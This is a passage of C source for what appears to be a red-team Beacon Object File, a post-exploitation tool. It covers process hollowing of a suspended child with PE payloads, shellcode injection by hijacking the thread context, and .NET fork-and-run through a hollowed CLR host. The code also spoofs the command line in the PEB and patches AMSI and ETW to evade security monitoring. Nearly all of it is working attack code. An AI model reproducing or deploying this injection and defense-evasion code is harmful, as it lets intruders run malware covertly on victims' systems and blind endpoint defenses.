    xmemset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_ALL;

    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    /* RDX = PEB address on x64 for suspended process */
    ULONG_PTR pebAddr = ctx.Rdx;
    ULONG_PTR origImageBase = 0;
    SIZE_T br = 0;

    /* PEB + 0x10 = ImageBaseAddress on x64 */
    if (!KERNEL32$ReadProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &origImageBase, sizeof(origImageBase), &br)) {
        BeaconPrintf(CALLBACK_ERROR, "Read PEB ImageBase: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Original image base: 0x%p", (void*)origImageBase);

    /* Step 2: Unmap original image */
    NTSTATUS st = NTDLL$NtUnmapViewOfSection(hProcess, (PVOID)origImageBase);
    if (st != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] NtUnmapViewOfSection: 0x%lx (continuing anyway)", st);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Original image unmapped");
    }

    /* Step 3: Allocate at preferred base, fall back to any address */
    ULONG_PTR preferredBase = pNt->OptionalHeader.ImageBase;
    BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
        (PVOID)preferredBase,
        pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemote) {
        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
            (PVOID)origImageBase,
            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!pRemote) {
        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, NULL,
            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!pRemote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated 0x%lx bytes at 0x%p", pNt->OptionalHeader.SizeOfImage, pRemote);

    /* Step 4: Map PE into SizeOfImage buffer so RVAs work as offsets */
    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
    BYTE *mapped = MapPEToImage(peData, peSize, pNt);
    if (!mapped) {
        BeaconPrintf(CALLBACK_ERROR, "MapPEToImage: %lu", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    /* Re-locate pNt inside mapped buffer */
    PIMAGE_DOS_HEADER pDosM = (PIMAGE_DOS_HEADER)mapped;
    PIMAGE_NT_HEADERS pNtM = (PIMAGE_NT_HEADERS)(mapped + pDosM->e_lfanew);

    /* Step 5: Resolve imports on mapped image */
    if (!ResolveImports(mapped, imageSize, pNtM)) {
        BeaconPrintf(CALLBACK_ERROR, "Import resolution failed — aborting");
        KERNEL32$LocalFree(mapped);
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Imports resolved");

    /* Step 6: Apply relocations if base changed */
    ULONG_PTR delta = (ULONG_PTR)pRemote - pNtM->OptionalHeader.ImageBase;
    if (delta != 0) {
        if (!ApplyRelocations(mapped, imageSize, pNtM, delta)) {
            BeaconPrintf(CALLBACK_ERROR, "Relocation failed");
            KERNEL32$LocalFree(mapped);
            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
            return FALSE;
        }
        pNtM->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Relocations applied (delta=0x%llx)", (unsigned long long)delta);
    }

    /* Step 7: Write mapped image to remote process */
    SIZE_T bw = 0;
    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, mapped,
            pNtM->OptionalHeader.SizeOfHeaders, &bw)) {
        BeaconPrintf(CALLBACK_ERROR, "Write headers: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(mapped);
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtM);
    for (DWORD i = 0; i < pNtM->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData == 0) continue;
        if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
                mapped + pSec[i].VirtualAddress, pSec[i].SizeOfRawData, &bw)) {
            BeaconPrintf(CALLBACK_ERROR, "Write section %d: %lu", i, KERNEL32$GetLastError());
            KERNEL32$LocalFree(mapped);
            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
            return FALSE;
        }
    }

    /* Save values we need after freeing mapped buffer */
    DWORD entryRva = pNtM->OptionalHeader.AddressOfEntryPoint;

    /* Step 8: Set proper section protections (pSec still valid, points into mapped) */
    if (!AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNtM, pSec)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Some section protections failed (continuing)");
    }

    KERNEL32$FlushInstructionCache(hProcess, pRemote, imageSize);

    KERNEL32$LocalFree(mapped);
    mapped = NULL;

    /* Step 9: Update PEB ImageBase */
    ULONG_PTR newBase = (ULONG_PTR)pRemote;
    if (!KERNEL32$WriteProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &newBase, sizeof(newBase), &bw)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PEB ImageBase update failed: %lu", KERNEL32$GetLastError());
    }

    /* Step 10: Set RCX = entry point */
    ctx.Rcx = (DWORD64)(pRemote + entryRva);

    if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    /* Step 10: Spoof command line in PEB */
    if (argsA && argsA[0]) {
        const char *basename = spawntoA;
        const char *s = spawntoA;
        while (*s) { if (*s == '\\' || *s == '/') basename = s + 1; s++; }

        char realCmd[4096];
        xmemset(realCmd, 0, sizeof(realCmd));
        MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", basename, argsA);
        if (SpoofCommandLine(hProcess, realCmd))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Command line spoofed");
    }

    /* Step 11: Patch AMSI + ETW */
    PatchAMSI(hProcess);
    PatchETW(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] PE hollowed at 0x%p, entry 0x%p",
                 pRemote, (void*)(ULONG_PTR)ctx.Rcx);
    return TRUE;
}

/* ================================================================
 *  Shellcode injection (unchanged — this path was already correct)
 * ================================================================ */

static BOOL InjectShellcode(HANDLE hProcess, HANDLE hThread, BYTE *scData, DWORD scSize) {
    if (scSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Shellcode is empty");
        return FALSE;
    }

    LPVOID pRemote = KERNEL32$VirtualAllocEx(hProcess, NULL, scSize,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx shellcode: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    SIZE_T bw = 0;
    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, scData, scSize, &bw)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory shellcode: %lu", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    DWORD oldProt = 0;
    KERNEL32$VirtualProtectEx(hProcess, pRemote, scSize, PAGE_EXECUTE_READ, &oldProt);

    KERNEL32$FlushInstructionCache(hProcess, pRemote, scSize);

    PatchETW(hProcess);

    CONTEXT ctx;
    xmemset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_ALL;

    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    ctx.Rip = (DWORD64)pRemote;

    if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode at 0x%p (%lu bytes), thread hijacked", pRemote, scSize);
    return TRUE;
}

/* ================================================================
 *  Read PE from local path on target
 * ================================================================ */

static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
    *outSize = 0;

    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                                         NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot open %s: %lu", path, KERNEL32$GetLastError());
        return NULL;
    }

    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad file size: %s", path);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, fileSize);
    if (!buf) {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!KERNEL32$ReadFile(hFile, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        BeaconPrintf(CALLBACK_ERROR, "ReadFile %s: %lu", path, KERNEL32$GetLastError());
        KERNEL32$LocalFree(buf);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    KERNEL32$CloseHandle(hFile);
    *outSize = fileSize;
    return buf;
}

/* ================================================================
 *  .NET fork-and-run via embedded CLR host (mode 2)
 *
 *  Hollows the embedded dotnet_host.exe into a sacrificial child,
 *  allocates a data region with DOTNET_CONFIG + .NET assembly + args,
 *  then uses a 22-byte trampoline shellcode to pass the config pointer
 *  in RCX before jumping to the host's entry point.
 *
 *  Crash in the .NET tool kills the child, not the beacon.
 * ================================================================ */

static BOOL HollowWithDotNet(HANDLE hProcess, HANDLE hThread,
                              BYTE *asmData, DWORD asmSize,
                              const char *argsA, const char *spawntoA) {

    /* --- Phase 1: Hollow embedded dotnet_host.exe into child --- */

    BYTE *hostPE = (BYTE*)KERNEL32$LocalAlloc(0x40, dotnet_host_exe_len);
    if (!hostPE) {
        BeaconPrintf(CALLBACK_ERROR, "LocalAlloc host PE: %lu", KERNEL32$GetLastError());
        return FALSE;
    }
    xmemcpy(hostPE, dotnet_host_exe, dotnet_host_exe_len);

    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePE(hostPE, dotnet_host_exe_len, &pNt)) {
        KERNEL32$LocalFree(hostPE);
        return FALSE;
    }

    CONTEXT ctx;
    xmemset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_ALL;
    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(hostPE);
        return FALSE;
    }

    ULONG_PTR pebAddr = ctx.Rdx;
    ULONG_PTR origImageBase = 0;
    SIZE_T br = 0;

    if (!KERNEL32$ReadProcessMemory(hProcess, (PVOID)(pebAddr + 0x10),
            &origImageBase, sizeof(origImageBase), &br)) {
        BeaconPrintf(CALLBACK_ERROR, "Read PEB ImageBase: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(hostPE);
        return FALSE;
    }

    NTDLL$NtUnmapViewOfSection(hProcess, (PVOID)origImageBase);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Original image unmapped");

    BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
        (PVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote)
        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, (PVOID)origImageBase,
            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote)
        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, NULL,
            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx host: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(hostPE);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Host PE allocated at 0x%p", pRemote);

    /* Map host PE so RVAs work as offsets for import/reloc processing */
    DWORD hostImageSize = pNt->OptionalHeader.SizeOfImage;
    BYTE *mapped = MapPEToImage(hostPE, dotnet_host_exe_len, pNt);
    KERNEL32$LocalFree(hostPE);
    hostPE = NULL;

    if (!mapped) {
        BeaconPrintf(CALLBACK_ERROR, "MapPEToImage host: %lu", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosH = (PIMAGE_DOS_HEADER)mapped;
    PIMAGE_NT_HEADERS pNtH = (PIMAGE_NT_HEADERS)(mapped + pDosH->e_lfanew);

    if (!ResolveImports(mapped, hostImageSize, pNtH)) {
        BeaconPrintf(CALLBACK_ERROR, "Host import resolution failed");
        KERNEL32$LocalFree(mapped);
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    ULONG_PTR delta = (ULONG_PTR)pRemote - pNtH->OptionalHeader.ImageBase;
    if (delta != 0) {
        if (!ApplyRelocations(mapped, hostImageSize, pNtH, delta)) {
            BeaconPrintf(CALLBACK_ERROR, "Host relocation failed");
            KERNEL32$LocalFree(mapped);
            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
            return FALSE;
        }
        pNtH->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
    }

    SIZE_T bw = 0;
    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, mapped,
            pNtH->OptionalHeader.SizeOfHeaders, &bw)) {
        BeaconPrintf(CALLBACK_ERROR, "Write host headers: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(mapped);
        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtH);
    for (DWORD i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData == 0) continue;
        if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
                mapped + pSec[i].VirtualAddress, pSec[i].SizeOfRawData, &bw)) {
            BeaconPrintf(CALLBACK_ERROR, "Write host section %d: %lu", i, KERNEL32$GetLastError());
            KERNEL32$LocalFree(mapped);
            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
            return FALSE;
        }
    }

    AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNtH, pSec);
    KERNEL32$FlushInstructionCache(hProcess, pRemote, hostImageSize);

    DWORD hostEntryRva = pNtH->OptionalHeader.AddressOfEntryPoint;
    KERNEL32$LocalFree(mapped);
    mapped = NULL;

    ULONG_PTR newBase = (ULONG_PTR)pRemote;
    KERNEL32$WriteProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &newBase, sizeof(newBase), &bw);

    ULONG_PTR entryPoint = (ULONG_PTR)(pRemote + hostEntryRva);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Host hollowed, entry 0x%p", (void*)entryPoint);

    /* --- Phase 2: Write config + assembly + args into child --- */

    DWORD argsByteSize = 0;
    LPWSTR wideArgs = NULL;
    if (argsA && argsA[0]) {
        int wLen = KERNEL32$MultiByteToWideChar(0, 0, argsA, -1, NULL, 0);
        if (wLen > 0) {
            wideArgs = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
            if (wideArgs) {
                KERNEL32$MultiByteToWideChar(0, 0, argsA, -1, wideArgs, wLen);
                argsByteSize = (DWORD)(wLen * sizeof(WCHAR));
            }
        }
    }

    DWORD configTotal = (DWORD)sizeof(DOTNET_CONFIG_HDR) + asmSize + argsByteSize;
    BYTE *configBuf = (BYTE*)KERNEL32$LocalAlloc(0x40, configTotal);
    if (!configBuf) {
        BeaconPrintf(CALLBACK_ERROR, "LocalAlloc config: %lu", KERNEL32$GetLastError());
        if (wideArgs) KERNEL32$LocalFree(wideArgs);
        return FALSE;
    }

    DOTNET_CONFIG_HDR *hdr = (DOTNET_CONFIG_HDR*)configBuf;
    hdr->magic     = DOTNET_CFG_MAGIC;
    hdr->asm_size  = asmSize;
    hdr->args_size = argsByteSize;
    hdr->flags     = DOTNET_FLAG_AMSI | DOTNET_FLAG_ETW;
    xmemcpy(configBuf + sizeof(DOTNET_CONFIG_HDR), asmData, asmSize);
    if (wideArgs && argsByteSize > 0)
        xmemcpy(configBuf + sizeof(DOTNET_CONFIG_HDR) + asmSize, wideArgs, argsByteSize);

    LPVOID pConfig = KERNEL32$VirtualAllocEx(hProcess, NULL, configTotal,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pConfig) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx config: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(configBuf);
        if (wideArgs) KERNEL32$LocalFree(wideArgs);
        return FALSE;
    }

    if (!KERNEL32$WriteProcessMemory(hProcess, pConfig, configBuf, configTotal, &bw)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory config: %lu", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(hProcess, pConfig, 0, MEM_RELEASE);
        KERNEL32$LocalFree(configBuf);
        if (wideArgs) KERNEL32$LocalFree(wideArgs);
        return FALSE;
    }

    KERNEL32$LocalFree(configBuf);
    if (wideArgs) KERNEL32$LocalFree(wideArgs);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Config at 0x%p (%lu bytes: hdr=%u asm=%lu args=%lu)",
        pConfig, configTotal,
        (unsigned)sizeof(DOTNET_CONFIG_HDR), (unsigned long)asmSize, (unsigned long)argsByteSize);

    /* --- Phase 3: Trampoline — set RCX=config, jump to entry --- */
    BYTE tramp[22];
    tramp[0] = 0x48; tramp[1] = 0xB9;
    *(ULONG_PTR*)(tramp + 2) = (ULONG_PTR)pConfig;
    tramp[10] = 0x48; tramp[11] = 0xB8;
    *(ULONG_PTR*)(tramp + 12) = entryPoint;
    tramp[20] = 0xFF; tramp[21] = 0xE0;

    LPVOID pTramp = KERNEL32$VirtualAllocEx(hProcess, NULL, sizeof(tramp),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!pTramp) {
        pTramp = KERNEL32$VirtualAllocEx(hProcess, NULL, 4096,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!pTramp) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx trampoline: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    DWORD oldProt = 0;
    KERNEL32$VirtualProtectEx(hProcess, pTramp, sizeof(tramp), PAGE_READWRITE, &oldProt);
    KERNEL32$WriteProcessMemory(hProcess, pTramp, tramp, sizeof(tramp), &bw);
    KERNEL32$VirtualProtectEx(hProcess, pTramp, sizeof(tramp), PAGE_EXECUTE_READ, &oldProt);
    KERNEL32$FlushInstructionCache(hProcess, pTramp, sizeof(tramp));

    ctx.Rcx = (DWORD64)pTramp;
    if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Trampoline at 0x%p → entry 0x%p (RCX=config)",
        pTramp, (void*)entryPoint);

    /* Step: Spoof command line */
    if (argsA && argsA[0]) {
        const char *bn = spawntoA;
        const char *s = spawntoA;
        while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
        char realCmd[4096];
        xmemset(realCmd, 0, sizeof(realCmd));
        MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", bn, argsA);
        if (SpoofCommandLine(hProcess, realCmd))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Command line spoofed");
    }

    PatchAMSI(hProcess);
    PatchETW(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] .NET fork-and-run ready (asm=%lu bytes)", (unsigned long)asmSize);
    return TRUE;
}

/* ================================================================
 *  BOF entry point
 * ================================================================ */

void go(char *rawArgs, int rawLen) {
    datap parser;
    BeaconDataParse(&parser, rawArgs, rawLen);

    int mode       = BeaconDataInt(&parser);
    int source     = BeaconDataInt(&parser);
    int noOutput   = BeaconDataInt(&parser);
    int timeoutMs  = BeaconDataInt(&parser);
    int blockDlls  = BeaconDataInt(&parser);
    int noPpid     = BeaconDataInt(&parser);

    int spawntoLen = 0;
    char *spawnto  = BeaconDataExtract(&parser, &spawntoLen);

    int argsLen = 0;
    char *args  = BeaconDataExtract(&parser, &argsLen);

    int localPathLen = 0;
    char *localPath  = BeaconDataExtract(&parser, &localPathLen);

    int peDataLen = 0;
    char *peData  = BeaconDataExtract(&parser, &peDataLen);

    const char *spawntoA = DEFAULT_SPAWNTO_A;
    if (spawnto && spawnto[0]) spawntoA = spawnto;

    if (timeoutMs <= 0) timeoutMs = DEFAULT_TIMEOUT_MS;
    BOOL wantOutput = (noOutput == OUTPUT_NO) ? FALSE : TRUE;

    /* Get payload bytes */
    BYTE *payloadData = NULL;
    DWORD payloadSize = 0;
    BOOL freePayload = FALSE;

    if (source == SRC_LOCAL_PATH) {
        if (!localPath || !localPath[0]) {
            BeaconPrintf(CALLBACK_ERROR, "No local path provided");
            return;
        }
        payloadData = ReadLocalFile(localPath, &payloadSize);
        if (!payloadData) return;
        freePayload = TRUE;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Read %lu bytes from %s", payloadSize, localPath);
    } else {
        if (!peData || peDataLen <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "No payload bytes received");
            return;
        }
        payloadData = (BYTE*)peData;
        payloadSize = (DWORD)peDataLen;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Mode: %s | Output: %s | Timeout: %ds | Spawnto: %s",
                 mode == MODE_PE ? "PE" : (mode == MODE_DOTNET ? ".NET" : "Shellcode"),
                 wantOutput ? "yes" : "no",
                 timeoutMs / 1000,
                 spawntoA);

    /* Compute real command line length for PEB padding */
    int realCmdMinBytes = 0;
    if ((mode == MODE_PE || mode == MODE_DOTNET) && args && args[0]) {
        const char *bn = spawntoA;
        const char *s = spawntoA;
        while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
        realCmdMinBytes = MSVCRT$strlen(bn) + 1 + MSVCRT$strlen(args);
    }

    /* Create suspended process */
    SPAWN_CTX sctx;
    if (!SpawnSuspended(spawntoA, wantOutput, blockDlls, noPpid, realCmdMinBytes, &sctx)) {
        if (freePayload) KERNEL32$LocalFree(payloadData);
        return;
    }

    BOOL ok = FALSE;

    if (mode == MODE_PE) {
        ok = HollowWithPE(sctx.pi.hProcess, sctx.pi.hThread,
                          payloadData, payloadSize, args, spawntoA);
    } else if (mode == MODE_DOTNET) {
        ok = HollowWithDotNet(sctx.pi.hProcess, sctx.pi.hThread,
                               payloadData, payloadSize, args, spawntoA);
    } else {
        ok = InjectShellcode(sctx.pi.hProcess, sctx.pi.hThread,
                             payloadData, payloadSize);
    }

    if (freePayload && payloadData) {
        KERNEL32$LocalFree(payloadData);
        payloadData = NULL;
    }

    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "Payload deployment failed, cleaning up");
        SpawnCleanup(&sctx, FALSE);
        return;
    }

    /* Resume thread */
    if (KERNEL32$ResumeThread(sctx.pi.hThread) == (DWORD)-1) {
        BeaconPrintf(CALLBACK_ERROR, "ResumeThread: %lu", KERNEL32$GetLastError());
        SpawnCleanup(&sctx, FALSE);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process resumed");

    /* Collect output or fire-and-forget */
    if (wantOutput && sctx.hPipeOutRead) {
        CollectOutput(sctx.pi.hProcess, sctx.hPipeOutRead, (DWORD)timeoutMs);
    } else if (!wantOutput) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] No-output mode, child running detached");
    }

    /* Final cleanup — handles only, child process already ran */
    if (sctx.hPipeOutRead) { KERNEL32$CloseHandle(sctx.hPipeOutRead); }
    if (sctx.hPipeInWrite) { KERNEL32$CloseHandle(sctx.hPipeInWrite); }
    if (sctx.pi.hProcess)  { KERNEL32$CloseHandle(sctx.pi.hProcess); }
    if (sctx.pi.hThread)   { KERNEL32$CloseHandle(sctx.pi.hThread); }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
}
